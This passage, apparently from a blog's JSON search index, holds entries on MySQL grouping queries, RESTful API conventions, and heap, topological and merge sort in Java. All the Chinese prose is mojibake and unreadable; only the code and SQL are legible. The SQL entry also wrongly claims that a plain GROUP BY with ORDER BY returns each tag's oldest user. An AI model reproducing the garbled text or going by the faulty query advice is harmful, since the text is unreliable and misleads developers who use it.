LOOP_LABLE; -\u0026gt; end if; -\u0026gt; end loop; -\u0026gt; end; -\u0026gt; // mysql \u0026gt; DELIMITER ; END!\n"},{"id":81,"href":"/posts/history/%E5%88%86%E7%BB%84%E6%9F%A5%E8%AF%A2%E5%B9%B6%E9%80%89%E6%8B%A9%E6%9C%80%E5%A4%A7%E6%9C%80%E5%B0%8F%E5%B9%B3%E5%9D%87%E5%80%BC%E7%AD%89%E4%BF%A1%E6%81%AF/","title":"åˆ†ç»„æŸ¥è¯¢å¹¶é€‰æ‹©æœ€å¤§æœ€å°å¹³å‡å€¼ç­‰ä¿¡æ¯","section":"æˆ‘çš„åšå®¢","content":"åˆ›å»ºä¸€ä¸ªç”¨æˆ·è¡¨ï¼Œç”¨äºæµ‹è¯•\nCREATE TABLE `user` ( `id` int(11) NOT NULL AUTO_INCREMENT, `name` varchar(255) NOT NULL, `age` int(5) DEFAULT NULL, `tag` varchar(255) DEFAULT NULL, PRIMARY KEY (`id`) ) 1ã€æŸ¥è¯¢tagæ ‡ç­¾ä¸­çš„æœ€å¤§å¹´é¾„ç”¨æˆ·çš„ä¿¡æ¯\nå…ˆæ’åºå†æŸ¥è¯¢\nselect * from (select * from user order by age desc) as u group by tag å…ˆæ’å¥½åºï¼Œç„¶åå†åˆ†ç»„æŸ¥è¯¢ç»„ä¸­çš„ç¬¬ä¸€æ¡ï¼Œä¹Ÿå°±æ˜¯tagä¸­ageæœ€å¤§å€¼çš„é‚£æ¡ä¿¡æ¯ã€‚\nä¹Ÿå¯ä»¥è¿™æ ·å†™\nselect * from user group by tag order by age desc å¦‚æœæ˜¯æŸ¥è¯¢æœ€å°å€¼å°±order by ascå°±å¯ä»¥äº†\n2ã€æŸ¥è¯¢tagæ ‡ç­¾ä¸­å¹³å‡å€¼æœ€å°çš„tagæ ‡ç­¾ä¿¡æ¯\nselect tag,avg(age) from user group by tag order by avg(age) limit 1 END!\n"},{"id":82,"href":"/posts/history/restfulapi%E8%AE%BE%E8%AE%A1%E8%A7%84%E8%8C%83/","title":"Restful Apiè®¾è®¡è§„èŒƒ","section":"æˆ‘çš„åšå®¢","content":"è¯·æ±‚æ ¼å¼\nRESTfulçš„æ ¸å¿ƒæ€æƒ³å°±æ˜¯ï¼Œå®¢æˆ·ç«¯å‘å‡ºçš„æ•°æ®+æ“ä½œæŒ‡ä»¤éƒ½æ˜¯â€œåŠ¨è¯+å®¾è¯­â€çš„ç»“æ„ï¼Œæ¯”å¦‚GET /articlesè¿™ä¸ªå‘½ä»¤ï¼ŒGETæ˜¯åŠ¨è¯ï¼Œ/articlesæ˜¯å®¾è¯­ï¼Œæœ‰äº”ç§HTTPè¯·æ±‚æ–¹å¼ã€‚\n# GETï¼šè¯»å–ï¼ˆReadï¼‰ # POSTï¼šæ–°å»ºï¼ˆCreateï¼‰ # PUTï¼šæ›´æ–°ï¼ˆUpdateï¼‰ # PATCHï¼šæ›´æ–°ï¼ˆUpdateï¼‰ï¼Œé€šå¸¸æ˜¯éƒ¨åˆ†æ›´æ–° # DELETEï¼šåˆ é™¤ï¼ˆDeleteï¼‰ åŠ¨è¯çš„è¦†ç›–\næœ‰äº›å®¢æˆ·ç«¯åªèƒ½ä½¿ç”¨GETå’ŒPOSTè¿™ä¸¤ç§æ–¹æ³•ã€‚æœåŠ¡å™¨å¿…é¡»æ¥å—POSTæ¨¡æ‹Ÿå…¶ä»–ä¸‰ä¸ªæ–¹æ³•ï¼ˆPUTã€PATCHã€DELETEï¼‰ã€‚è¿™æ—¶ï¼Œå®¢æˆ·ç«¯å‘å‡ºçš„ HTTP è¯·æ±‚ï¼Œè¦åŠ ä¸ŠX-HTTP-Method-Overrideå±æ€§ï¼Œå‘Šè¯‰æœåŠ¡å™¨åº”è¯¥ä½¿ç”¨å“ªä¸€ä¸ªåŠ¨è¯ï¼Œè¦†ç›–POSTæ–¹æ³•ã€‚\nPOST /api/person/4 HTTP/1.1 X-HTTP-Method-Override: PUT å¤æ•° URL\nä¸ºäº†ç»Ÿä¸€èµ·è§ï¼Œå»ºè®®éƒ½ä½¿ç”¨å¤æ•° URLï¼Œæ¯”å¦‚GET /articles/2è¦å¥½äºGET /article/2ã€‚\nå•è¯é—®é¢˜ å‡ºç°å•è¯æ‹¼æ¥æ—¶ï¼Œç”¨-åˆ†éš”ã€‚\né¿å…å¤šçº§ URL\nå¸¸è§çš„æƒ…å†µæ˜¯ï¼Œèµ„æºéœ€è¦å¤šçº§åˆ†ç±»ï¼Œå› æ­¤å¾ˆå®¹æ˜“å†™å‡ºå¤šçº§çš„ URLï¼Œæ¯”å¦‚è·å–æŸä¸ªä½œè€…çš„æŸä¸€ç±»æ–‡ç« ã€‚\n# GET /authors/12/categories/2 è¿™ç§ URL ä¸åˆ©äºæ‰©å±•ï¼Œè¯­ä¹‰ä¹Ÿä¸æ˜ç¡®ï¼Œå¾€å¾€è¦æƒ³ä¸€ä¼šï¼Œæ‰èƒ½æ˜ç™½å«ä¹‰ã€‚ æ›´å¥½çš„åšæ³•æ˜¯ï¼Œé™¤äº†ç¬¬ä¸€çº§ï¼Œå…¶ä»–çº§åˆ«éƒ½ç”¨æŸ¥è¯¢å­—ç¬¦ä¸²è¡¨è¾¾ã€‚\n# GET /authors/12?categories=2 ä¸‹é¢æ˜¯å¦ä¸€ä¸ªä¾‹å­ï¼ŒæŸ¥è¯¢å·²å‘å¸ƒçš„æ–‡ç« ã€‚ä½ å¯èƒ½ä¼šè®¾è®¡æˆä¸‹é¢çš„ URLã€‚\n# GET /articles/published æŸ¥è¯¢å­—ç¬¦ä¸²çš„å†™æ³•æ˜æ˜¾æ›´å¥½\n# GET /articles?published=true ä¸è¦è¿”å›çº¯æœ¬æ–‡\nAPI è¿”å›çš„æ•°æ®æ ¼å¼ï¼Œä¸åº”è¯¥æ˜¯çº¯æ–‡æœ¬ï¼Œè€Œåº”è¯¥æ˜¯ä¸€ä¸ª JSON å¯¹è±¡ï¼Œå› ä¸ºè¿™æ ·æ‰èƒ½è¿”å›æ ‡å‡†çš„ç»“æ„åŒ–æ•°æ®ã€‚æ‰€ä»¥ï¼ŒæœåŠ¡å™¨å›åº”çš„ HTTP å¤´çš„Content-Typeå±æ€§è¦è®¾ä¸ºapplication/jsonã€‚\nå®¢æˆ·ç«¯è¯·æ±‚æ—¶ï¼Œä¹Ÿè¦æ˜ç¡®å‘Šè¯‰æœåŠ¡å™¨ï¼Œå¯ä»¥æ¥å— JSON æ ¼å¼ï¼Œå³è¯·æ±‚çš„ HTTP å¤´çš„ACCEPTå±æ€§ä¹Ÿè¦è®¾æˆapplication/jsonã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚\nGET /orders/2 HTTP/1.1 Accept: application/json å‘ç”Ÿé”™è¯¯æ—¶ï¼Œä¸è¦è¿”å› 200 çŠ¶æ€ç \næœ‰ä¸€ç§ä¸æ°å½“çš„åšæ³•æ˜¯ï¼Œå³ä½¿å‘ç”Ÿé”™è¯¯ï¼Œä¹Ÿè¿”å›200çŠ¶æ€ç ï¼ŒæŠŠé”™è¯¯ä¿¡æ¯æ”¾åœ¨æ•°æ®ä½“é‡Œé¢ï¼Œå°±åƒä¸‹é¢è¿™æ ·ã€‚\nHTTP/1.1 200 OK Content-Type: application/json { \u0026#34;status\u0026#34;: \u0026#34;failure\u0026#34;, \u0026#34;data\u0026#34;: { \u0026#34;error\u0026#34;: \u0026#34;Expected at least two items in list.\u0026#34; } } ä¸Šé¢ä»£ç ä¸­ï¼Œè§£ææ•°æ®ä½“ä»¥åï¼Œæ‰èƒ½å¾—çŸ¥æ“ä½œå¤±è´¥ã€‚\nè¿™ç§åšæ³•å®é™…ä¸Šå–æ¶ˆäº†çŠ¶æ€ç ï¼Œè¿™æ˜¯å®Œå…¨ä¸å¯å–çš„ã€‚æ­£ç¡®çš„åšæ³•æ˜¯ï¼ŒçŠ¶æ€ç åæ˜ å‘ç”Ÿçš„é”™è¯¯ï¼Œå…·ä½“çš„é”™è¯¯ä¿¡æ¯æ”¾åœ¨æ•°æ®ä½“é‡Œé¢è¿”å›ã€‚\nHTTP/1.1 400 Bad Request Content-Type: application/json { \u0026#34;error\u0026#34;: \u0026#34;Invalid payoad.\u0026#34;, \u0026#34;detail\u0026#34;: { \u0026#34;surname\u0026#34;: \u0026#34;This field is required.\u0026#34; } } å¸¸è§çš„çŠ¶æ€ç \n2XX çŠ¶æ€ç ï¼šè¯·æ±‚æˆåŠŸ\n200 OKï¼šçŠ¶æ€ç è¡¨ç¤ºæ“ä½œæˆåŠŸã€‚ 201 Createdï¼šæˆåŠŸè¯·æ±‚å¹¶åˆ›å»ºäº†æ–°çš„èµ„æºï¼Œç”¨äºPOSTè¯·æ±‚è¿”å›ã€‚ 202 Acceptedï¼šè¡¨ç¤ºæœåŠ¡å™¨å·²ç»æ”¶åˆ°è¯·æ±‚ï¼Œä½†è¿˜æœªè¿›è¡Œå¤„ç†ï¼Œä¼šåœ¨æœªæ¥å†å¤„ç†ï¼Œç”¨äºå¼‚æ­¥æ“ä½œã€‚ 204 No Contentï¼šè¡¨ç¤ºèµ„æºå·²ç»ä¸å­˜åœ¨ï¼Œç”¨äºDELETEè¯·æ±‚è¿”å›ã€‚ 3XX çŠ¶æ€ç ï¼šé‡å®šå‘\n301 Moved Permanentlyï¼šçŠ¶æ€ç ï¼ˆæ°¸ä¹…é‡å®šå‘ï¼‰ã€‚ 302 Foundï¼šçŠ¶æ€ç ï¼ˆæš‚æ—¶é‡å®šå‘ï¼‰ã€‚ 303 See Otherï¼šè¡¨ç¤ºå‚è€ƒå¦ä¸€ä¸ª URLã€‚ 4XX çŠ¶æ€ç :è¡¨ç¤ºå®¢æˆ·ç«¯é”™è¯¯\n400 Bad Requestï¼šæœåŠ¡å™¨ä¸ç†è§£å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œæœªåšä»»ä½•å¤„ç†ã€‚ 401 Unauthorizedï¼šç”¨æˆ·æœªæä¾›èº«ä»½éªŒè¯å‡­æ®ï¼Œæˆ–è€…æ²¡æœ‰é€šè¿‡èº«ä»½éªŒè¯ã€‚ 403 Forbiddenï¼šç”¨æˆ·é€šè¿‡äº†èº«ä»½éªŒè¯ï¼Œä½†æ˜¯ä¸å…·æœ‰è®¿é—®èµ„æºæ‰€éœ€çš„æƒé™ã€‚ 404 Not Foundï¼šæ‰€è¯·æ±‚çš„èµ„æºä¸å­˜åœ¨ï¼Œæˆ–ä¸å¯ç”¨ã€‚ 405 Method Not Allowedï¼šç”¨æˆ·å·²ç»é€šè¿‡èº«ä»½éªŒè¯ï¼Œä½†æ˜¯æ‰€ç”¨çš„ HTTP æ–¹æ³•ä¸åœ¨ä»–çš„æƒé™ä¹‹å†…ã€‚ 410 Goneï¼šæ‰€è¯·æ±‚çš„èµ„æºå·²ä»è¿™ä¸ªåœ°å€è½¬ç§»ï¼Œä¸å†å¯ç”¨ã€‚ 415 Unsupported Media Typeï¼šå®¢æˆ·ç«¯è¦æ±‚çš„è¿”å›æ ¼å¼ä¸æ”¯æŒã€‚æ¯”å¦‚ï¼ŒAPI åªèƒ½è¿”å› JSON æ ¼å¼ï¼Œä½†æ˜¯å®¢æˆ·ç«¯è¦æ±‚è¿”å› XML æ ¼å¼ã€‚ 422 Unprocessable Entity ï¼šå®¢æˆ·ç«¯ä¸Šä¼ çš„é™„ä»¶æ— æ³•å¤„ç†ï¼Œå¯¼è‡´è¯·æ±‚å¤±è´¥ã€‚ 429 Too Many Requestsï¼šå®¢æˆ·ç«¯çš„è¯·æ±‚æ¬¡æ•°è¶…è¿‡é™é¢ã€‚ 5XX çŠ¶æ€ç :è¡¨ç¤ºæœåŠ¡ç«¯é”™è¯¯ã€‚\nä¸€èˆ¬æ¥è¯´ï¼ŒAPI ä¸ä¼šå‘ç”¨æˆ·é€éœ²æœåŠ¡å™¨çš„è¯¦ç»†ä¿¡æ¯ï¼Œæ‰€ä»¥åªè¦ä¸¤ä¸ªçŠ¶æ€ç å°±å¤Ÿäº†ã€‚ 500 Internal Server Errorï¼šå®¢æˆ·ç«¯è¯·æ±‚æœ‰æ•ˆï¼ŒæœåŠ¡å™¨å¤„ç†æ—¶å‘ç”Ÿäº†æ„å¤–ã€‚ 503 Service Unavailableï¼šæœåŠ¡å™¨æ— æ³•å¤„ç†è¯·æ±‚ï¼Œä¸€èˆ¬ç”¨äºç½‘ç«™ç»´æŠ¤çŠ¶æ€ã€‚ END!\n"},{"id":83,"href":"/posts/history/%E5%A0%86%E6%8E%92%E5%BA%8F/","title":"å †æ’åº","section":"æˆ‘çš„åšå®¢","content":"å †å®šä¹‰ æ¯ä¸ªå †éƒ½æ˜¯å®Œå…¨äºŒå‰æ ‘ï¼ˆä»ä¸Šåˆ°ä¸‹ï¼Œä»å·¦åˆ°å³ï¼Œé«˜æœ€å¤§ç›¸å·®ä¸€ï¼‰ã€‚ å¤§é¡¶å †ï¼šæ¯ä¸ªç»“ç‚¹çš„å€¼éƒ½å¤§äºæˆ–ç­‰äºå…¶å·¦å³å­©å­ç»“ç‚¹çš„å€¼ã€‚ å°é¡¶å †ï¼šæ¯ä¸ªç»“ç‚¹çš„å€¼éƒ½å°äºæˆ–ç­‰äºå…¶å·¦å³å­©å­ç»“ç‚¹çš„å€¼ã€‚\nåŒæ—¶ï¼Œæˆ‘ä»¬å¯¹å †ä¸­çš„ç»“ç‚¹æŒ‰å±‚è¿›è¡Œç¼–å·ï¼Œå°†è¿™ç§é€»è¾‘ç»“æ„æ˜ å°„åˆ°æ•°ç»„ä¸­å°±æ˜¯ä¸‹é¢è¿™ä¸ªæ ·å­ã€‚ æ•´ä½“è§£é¢˜æ€è·¯ï¼š 1ã€å…ˆæŠŠè¦æ’åºçš„æ•°æ®æ”¾åˆ°æ•°ç»„ä¸­ã€‚ 2ã€å¯¹æ•°ç»„ä¸­çš„æ•°ç»„è¿›è¡Œæ„å»ºæˆå †ã€‚ 3ã€å°†æ„å»ºå¥½çš„å †ä¸­çš„å¤´æ•°æ®ä¸ç»“å°¾æ•°æ®äº¤æ¢å¹¶æˆªå–å‡ºç»“å°¾æ•°æ®ã€‚ 4ã€ç»§ç»­å°†å‰©ä¸‹çš„æ•°æ®æ„å»ºæˆå †ï¼Œå¹¶é‡å¤3æ“ä½œï¼Œç›´åˆ°ç»“æŸã€‚\næ„å»ºæˆå †æ—¶çš„å‡ ä¸ªå…³é”®ç‚¹ï¼š 1ã€å°¾éƒ¨å…ƒç´ çš„çˆ¶ç»“ç‚¹è®¡ç®—ï¼š (arr.length-1)/2 2ã€çˆ¶å…ƒç´ çš„å·¦ç»“ç‚¹è®¡ç®—ï¼ši * 2 + 1 3ã€çˆ¶å…ƒç´ çš„å³ç»“ç‚¹è®¡ç®—ï¼ši * 2 + 2 4ã€ä»å³åˆ°å·¦ï¼Œä»ä¸‹åˆ°ä¸Šè¿›è¡Œæ¯”è¾ƒä¸äº¤æ¢ï¼Œæœ€åå½¢æˆå †\nJavaä»£ç \npublic class HeapSort { public static void main(String[] args) { int[] arr = {16, 2,123,7, 3, 20, 17, 8,123,1,221}; HeapSort heapSort = new HeapSort(); heapSort.heapSort(arr); System.out.println(Arrays.toString(arr)); } public void heapSort(int[] arr) { // æ‰¾å‡ºå¤§å¤´å †ï¼Œä¸ç»“å°¾äº¤æ¢ï¼Œå¹¶æˆªå–å‡ºå°¾éƒ¨ for (int i = arr.length-1; i \u0026gt; 0; i--) { // å°†äº¤æ¢åçš„æ•°ç»„ï¼Œå†æ¬¡æ„å»ºæˆå † buildHeap(arr,i); swap(arr,0, i); } } /** * æ„å»ºå † * 10 * / \\ * 5 8 * / \\ / \\ * 3 4 6 7 * æ­£å¥½å¯ä»¥ç”¨ä¸€ä¸ªæ•°ç»„è¡¨ç¤º {10,5,8,3,4,6,7} * å…ƒç´ çˆ¶èŠ‚ç‚¹ï¼š (i-1)/2 * å…ƒç´ å·¦å­èŠ‚ç‚¹ï¼š 2i+1 * å…ƒç´ å³å­èŠ‚ç‚¹ï¼š 2i+2 * @param arr æ•°ç»„ * @param length å †é•¿åº¦ */ private void buildHeap(int[] arr, int length) { // çˆ¶èŠ‚ç‚¹ int parent = (length - 1) / 2; for (int i = parent; i \u0026gt;= 0 ; i--) { adjustHeap(arr, i, length); } } /** * è°ƒæ•´å †ï¼Œï¼Œæ‰¾å‡ºæœ€å¤§å€¼èŠ‚ç‚¹ï¼Œä¸parentèŠ‚ç‚¹äº¤æ¢ * @param arr æ•°ç»„ * @param parent çˆ¶èŠ‚ç‚¹ * @param length å †é•¿åº¦ */ private void adjustHeap(int[] arr, int parent, int length) { int leftChild = 2 * parent + 1; int max = parent; // å·¦èŠ‚ç‚¹ if (leftChild \u0026lt;= length \u0026amp;\u0026amp; arr[leftChild] \u0026gt; arr[max]) { max = leftChild; } // å³èŠ‚ç‚¹ if (leftChild + 1 \u0026lt;= length \u0026amp;\u0026amp; arr[leftChild + 1] \u0026gt; arr[max]) { max = leftChild + 1; } if (max != parent) { swap(arr, max, parent); } } private void swap(int[] arr, int i, int j) { int tmp = arr[i]; arr[i] = arr[j]; arr[j] = tmp; } } "},{"id":84,"href":"/posts/history/%E6%8B%93%E6%89%91%E6%8E%92%E5%BA%8F/","title":"æ‹“æ‰‘æ’åº","section":"æˆ‘çš„åšå®¢","content":"åŸºæœ¬æ€æƒ³ æ‹“æ‰‘æ’åºåº”ç”¨çš„åœºåˆä¸å†æ˜¯ä¸€ä¸ªç®€å•çš„æ•°ç»„ï¼Œè€Œæ˜¯ç ”ç©¶å›¾è®ºé‡Œé¢é¡¶ç‚¹å’Œé¡¶ç‚¹è¿çº¿ä¹‹é—´çš„æ€§è´¨ã€‚æ‹“æ‰‘æ’åºå°±æ˜¯è¦å°†è¿™äº›é¡¶ç‚¹æŒ‰ç…§ç›¸è¿çš„æ€§è´¨è¿›è¡Œæ’åºã€‚æ‹“æ‰‘æ’åºä¸€èˆ¬ç”¨æ¥ç†æ¸…å…·æœ‰ä¾èµ–å…³ç³»çš„ä»»åŠ¡ã€‚\nå®ç°\nå°†é—®é¢˜ç”¨ä¸€ä¸ªæœ‰å‘æ— ç¯å›¾ï¼ˆDAG, Directed Acyclic Graphï¼‰è¿›è¡ŒæŠ½è±¡è¡¨è¾¾ï¼Œå®šä¹‰å‡ºå“ªäº›æ˜¯å›¾çš„é¡¶ç‚¹ï¼Œé¡¶ç‚¹ä¹‹é—´å¦‚ä½•äº’ç›¸å…³è”ã€‚ å¯ä»¥åˆ©ç”¨å¹¿åº¦ä¼˜å…ˆæœç´¢æˆ–æ·±åº¦ä¼˜å…ˆæœç´¢æ¥è¿›è¡Œæ‹“æ‰‘æ’åºã€‚ Leetcodeé¢˜ç›®\nLeetcode 207. è¯¾ç¨‹è¡¨ Leetcode 210. è¯¾ç¨‹è¡¨ II è¯¾ç¨‹è¡¨ II è§£é¢˜\né¢˜ç›®\nç°åœ¨ä½ æ€»å…±æœ‰ n é—¨è¯¾éœ€è¦é€‰ï¼Œè®°ä¸ºÂ 0Â åˆ°Â n-1ã€‚ åœ¨é€‰ä¿®æŸäº›è¯¾ç¨‹ä¹‹å‰éœ€è¦ä¸€äº›å…ˆä¿®è¯¾ç¨‹ã€‚Â ä¾‹å¦‚ï¼Œæƒ³è¦å­¦ä¹ è¯¾ç¨‹ 0 ï¼Œä½ éœ€è¦å…ˆå®Œæˆè¯¾ç¨‹Â 1 ï¼Œæˆ‘ä»¬ç”¨ä¸€ä¸ªåŒ¹é…æ¥è¡¨ç¤ºä»–ä»¬: [0,1] ç»™å®šè¯¾ç¨‹æ€»é‡ä»¥åŠå®ƒä»¬çš„å…ˆå†³æ¡ä»¶ï¼Œè¿”å›ä½ ä¸ºäº†å­¦å®Œæ‰€æœ‰è¯¾ç¨‹æ‰€å®‰æ’çš„å­¦ä¹ é¡ºåºã€‚ å¯èƒ½ä¼šæœ‰å¤šä¸ªæ­£ç¡®çš„é¡ºåºï¼Œä½ åªè¦è¿”å›ä¸€ç§å°±å¯ä»¥äº†ã€‚å¦‚æœä¸å¯èƒ½å®Œæˆæ‰€æœ‰è¯¾ç¨‹ï¼Œè¿”å›ä¸€ä¸ªç©ºæ•°ç»„ã€‚ ç¤ºä¾‹: è¾“å…¥: 4, [[1,0],[2,0],[3,1],[3,2]] è¾“å‡º: [0,1,2,3] or [0,2,1,3] è§£é‡Š:Â æ€»å…±æœ‰ 4 é—¨è¯¾ç¨‹ã€‚è¦å­¦ä¹ è¯¾ç¨‹ 3ï¼Œä½ åº”è¯¥å…ˆå®Œæˆè¯¾ç¨‹ 1 å’Œè¯¾ç¨‹ 2ã€‚å¹¶ä¸”è¯¾ç¨‹ 1 å’Œè¯¾ç¨‹ 2 éƒ½åº”è¯¥æ’åœ¨è¯¾ç¨‹ 0 ä¹‹åã€‚ å› æ­¤ï¼Œä¸€ä¸ªæ­£ç¡®çš„è¯¾ç¨‹é¡ºåºæ˜¯Â [0,1,2,3] ã€‚å¦ä¸€ä¸ªæ­£ç¡®çš„æ’åºæ˜¯Â [0,2,1,3] ã€‚ æ­¥éª¤\n1ã€è®¾å®šé¡¶ç‚¹ï¼ˆèŠ‚ç‚¹ï¼‰å˜é‡ä¸ªæ•°ï¼Œå’Œä¸ªæ•°ä¹‹é—´çš„è·¯çº¿å…³ç³»ï¼ˆç”¨äºŒç»´æ•°ç»„ä¿å­˜ï¼‰ 2ã€ä½¿ç”¨ä¸€ä¸ªä¸€ç»´æ•°ç»„ç”¨æ¥è®°å½•é¡¶ç‚¹ï¼ˆèŠ‚ç‚¹ï¼‰å…¥åº¦çš„æ•°é‡ 3ã€è®¾ç½®ä¸€ä¸ªé˜Ÿåˆ—ï¼ŒæŠŠå…¥åº¦ä¸º0çš„æ•°æ”¾å…¥é˜Ÿåˆ— 4ã€è®¾ç½®ä¸€ä¸ªä¸€ç»´æ•°ç»„ç”¨äºä¿å­˜è¿”å›å€¼ï¼Œå–å‡ºé˜Ÿåˆ—å…ƒç´ æ”¾åˆ°ä¸€ç»´æ•°ç»„ï¼Œå¹¶ä¿®æ”¹å…¶ä»–èŠ‚ç‚¹çš„å…¥åº¦æ•°é‡ã€‚ 5ã€è¿”å›\nJavaä»£ç \npublic int[] topologicalSort(int numCourses, int[][] prerequisites) { // ç”¨äºä¿å­˜èŠ‚ç‚¹å…¥åº¦ int[] in = new int[numCourses]; // å“åº”ç»“æœ int[] res = new int[numCourses]; // é˜Ÿåˆ—ï¼Œç”¨äºä¿å­˜å…¥åº¦ä¸º0çš„ç»“ç‚¹ Queue\u0026lt;Integer\u0026gt; queue = new LinkedList\u0026lt;\u0026gt;(); // ç»Ÿè®¡èŠ‚ç‚¹çš„å…¥åº¦ for (int[] edge: prerequisites) { in[edge[0]]++; } // æŠŠå…¥åº¦ä¸º0çš„ç»“ç‚¹æ”¾å…¥é˜Ÿåˆ— for (int i = 0; i \u0026lt; numCourses; i++) { if (in[i] == 0) { queue.offer(i); } } // è¿”å›å€¼ç´¢å¼• int index = 0; // å½“æœ‰å…¥åº¦ä¸º0æ—¶ï¼Œæ‰§è¡Œ while (!queue.isEmpty()) { Integer tmp = queue.poll(); res[index++] = tmp; for (int[] edge : prerequisites) { if (edge[1] == tmp) { // å‡å°‘å…¥åº¦ä¸ªæ•° in[edge[0]]--; // å…¥åº¦ä¸º0ï¼Œæ”¾å…¥é˜Ÿåˆ—ä¸­ if (in[edge[0]] == 0) { queue.offer(edge[0]); } } } } // å¦‚æœå‡ºç°ç¯äº†ï¼Œå…¥åº¦æ²¡æœ‰0çš„ç»“ç‚¹ if (index != numCourses) { return new int[]{}; } return res; } END!\n"},{"id":85,"href":"/posts/history/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/","title":"å½’å¹¶æ’åº","section":"æˆ‘çš„åšå®¢","content":"åŸºæœ¬æ€æƒ³ æ ¸å¿ƒæ˜¯åˆ†æ²»ï¼Œå°±æ˜¯æŠŠä¸€ä¸ªå¤æ‚çš„é—®é¢˜åˆ†æˆä¸¤ä¸ªæˆ–å¤šä¸ªç›¸åŒæˆ–ç›¸ä¼¼çš„å­é—®é¢˜ï¼Œç„¶åæŠŠå­é—®é¢˜åˆ†æˆæ›´å°çš„å­é—®é¢˜ï¼Œç›´åˆ°å­é—®é¢˜å¯ä»¥ç®€å•çš„ç›´æ¥æ±‚è§£ã€‚\nå®ç° æŠŠæ•°ç»„ä»ä¸­é—´åˆ’åˆ†æˆä¸¤ä¸ªå­æ•°ç»„ï¼Œä¸€ç›´é€’å½’åœ°æŠŠå­æ•°ç»„åˆ’åˆ†æˆæ›´å°çš„å­æ•°ç»„ï¼Œç›´åˆ°å­æ•°ç»„é‡Œé¢åªæœ‰ä¸€ä¸ªå…ƒç´ ï¼Œæ‰å¼€å§‹åˆå¹¶æ’åºã€‚\nåˆ†è§£å·¦å³å¹¶æ’åº å·¦å³ä¸¤éƒ¨åˆ†åˆå¹¶æ’åº Javaä»£ç \npublic void mergeSort(int[] nums, int left, int right) { if (left \u0026gt;= right) { return; } int middle = (left + right)/2; // åˆ†åŒ–æ•°ç»„ mergeSort(nums, left, middle); // åˆ†åŒ–æ•°ç»„ mergeSort(nums, middle+1, right); // åˆå¹¶å·¦å³è¾¹ merge(nums,left,middle,right); } // åˆå¹¶æ’åºå¥½çš„å·¦è¾¹å’Œå³è¾¹ public void merge(int[] nums, int left, int middle, int right) { //ä¸´æ—¶æ•°ç»„ int[] tmp = new int[right-left+1]; // start1 å·¦è¾¹ç´¢å¼• start2å³è¾¹ç´¢å¼• index ä¸´æ—¶æ•°ç»„ç´¢å¼• int start1 = left, start2 = middle + 1, index = 0; while (start1 \u0026lt;= middle || start2 \u0026lt;= right) { if (start1 \u0026gt; middle) { // å·¦è¾¹å·²ç»æ’åºå®Œï¼Œåªæ’åºå³è¾¹ tmp[index++] = nums[start2++]; } else if (start2 \u0026gt; right) { //å³è¾¹å·²ç»æ’åºå®Œï¼Œåªæ’åºå·¦è¾¹ tmp[index++] = nums[start1++]; } else if (nums[start1] \u0026gt; nums[start2]) { //ä¸¤è¾¹éƒ½æ²¡æœ‰æ’åºå®Œ tmp[index++] = nums[start2++]; } else { //ä¸¤è¾¹éƒ½æ²¡æœ‰æ’åºå®Œ tmp[index++] = nums[start1++]; } } // æŠŠæ’åºå¥½çš„æ•°æ®é‡æ–°èµ‹å€¼å›åŸæ•°ç»„ä¸­ for (int i = left; i \u0026lt;= right; i++) { nums[i] = tmp[i-left]; } } ç©ºé—´å¤æ‚åº¦\nç”±äºåˆå¹¶ n ä¸ªå…ƒç´ éœ€è¦åˆ†é…ä¸€ä¸ªå¤§å°ä¸º n çš„é¢å¤–æ•°ç»„ï¼Œåˆå¹¶å®Œæˆä¹‹åï¼Œè¿™ä¸ªæ•°ç»„çš„ç©ºé—´å°±ä¼šè¢«é‡Šæ”¾ï¼Œæ‰€ä»¥ç®—æ³•çš„ç©ºé—´å¤æ‚åº¦å°±æ˜¯ O(n)ã€‚å½’å¹¶æ’åºä¹Ÿæ˜¯ç¨³å®šçš„æ’åºç®—æ³•ã€‚\næ—¶é—´å¤æ‚åº¦\nå½’å¹¶ç®—æ³•æ˜¯ä¸€ä¸ªä¸æ–­é€’å½’çš„è¿‡ç¨‹ã€‚\nä¸¾ä¾‹ï¼šæ•°ç»„çš„å…ƒç´ ä¸ªæ•°æ˜¯ nï¼Œæ—¶é—´å¤æ‚åº¦æ˜¯ T(n) çš„å‡½æ•°ã€‚\nè§£æ³•ï¼šæŠŠè¿™ä¸ªè§„æ¨¡ä¸º n çš„é—®é¢˜åˆ†æˆä¸¤ä¸ªè§„æ¨¡åˆ†åˆ«ä¸º n/2 çš„å­é—®é¢˜ï¼Œæ¯ä¸ªå­é—®é¢˜çš„æ—¶é—´å¤æ‚åº¦å°±æ˜¯ T(n/2)ï¼Œé‚£ä¹ˆä¸¤ä¸ªå­é—®é¢˜çš„å¤æ‚åº¦å°±æ˜¯ 2Ã—T(n/2)ã€‚å½“ä¸¤ä¸ªå­é—®é¢˜éƒ½å¾—åˆ°äº†è§£å†³ï¼Œå³ä¸¤ä¸ªå­æ•°ç»„éƒ½æ’å¥½äº†åºï¼Œéœ€è¦å°†å®ƒä»¬åˆå¹¶ï¼Œä¸€å…±æœ‰ n ä¸ªå…ƒç´ ï¼Œæ¯æ¬¡éƒ½è¦è¿›è¡Œæœ€å¤š n-1 æ¬¡çš„æ¯”è¾ƒï¼Œæ‰€ä»¥åˆå¹¶çš„å¤æ‚åº¦æ˜¯ O(n)ã€‚ç”±æ­¤æˆ‘ä»¬å¾—åˆ°äº†é€’å½’å¤æ‚åº¦å…¬å¼ï¼šT(n) = 2Ã—T(n/2) + O(n)ã€‚\nå¯¹äºå…¬å¼æ±‚è§£ï¼Œä¸æ–­åœ°æŠŠä¸€ä¸ªè§„æ¨¡ä¸º n çš„é—®é¢˜åˆ†è§£æˆè§„æ¨¡ä¸º n/2 çš„é—®é¢˜ï¼Œä¸€ç›´åˆ†è§£åˆ°è§„æ¨¡å¤§å°ä¸º 1ã€‚å¦‚æœ n ç­‰äº 2ï¼Œåªéœ€è¦åˆ†ä¸€æ¬¡ï¼›å¦‚æœ n ç­‰äº 4ï¼Œéœ€è¦åˆ† 2 æ¬¡ã€‚è¿™é‡Œçš„æ¬¡æ•°æ˜¯æŒ‰ç…§è§„æ¨¡å¤§å°çš„å˜åŒ–åˆ†ç±»çš„ã€‚\nä»¥æ­¤ç±»æ¨ï¼Œå¯¹äºè§„æ¨¡ä¸º n çš„é—®é¢˜ï¼Œä¸€å…±è¦è¿›è¡Œ log(n) 